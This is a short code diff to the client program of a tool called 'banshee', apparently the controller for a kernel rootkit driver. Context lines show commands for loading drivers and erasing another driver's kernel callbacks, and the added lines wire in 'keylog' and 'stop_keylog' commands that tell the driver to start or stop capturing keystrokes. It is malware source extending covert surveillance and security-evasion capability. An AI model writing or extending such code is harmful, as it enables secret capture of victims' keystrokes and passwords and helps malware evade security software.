@@ -76,6 +76,9 @@ main(INT argc, CHAR *argv[])
             printf("    test      - test driver\n");
             printf("    load      - load driver from path\n");
             printf("    unload    - unload driver\n");
+            printf("Misc:\n");
+            printf("    keylog         - start keylogger\n");
+            printf("    stop_keylog    - stop keylogger\n");
             printf("\n");
             printf("    exit      - exit banshee\n");
             continue;
@@ -184,6 +187,16 @@ main(INT argc, CHAR *argv[])
 
             LogInfo("Attempting to erase callbacks of " + targetDriver);
             status = banshee.IoCtlEraseCallbacks(targetDriver);
+        }
+        else if (choice == "keylog")
+        {
+            LogInfo("Starting keylogger");
+            status = banshee.IoCtlStartKeylogger(TRUE);
+        }
+        else if (choice == "stop_keylog")
+        {
+            LogInfo("Stopping keylogger");
+            status = banshee.IoCtlStartKeylogger(FALSE);
         }
         else
         {
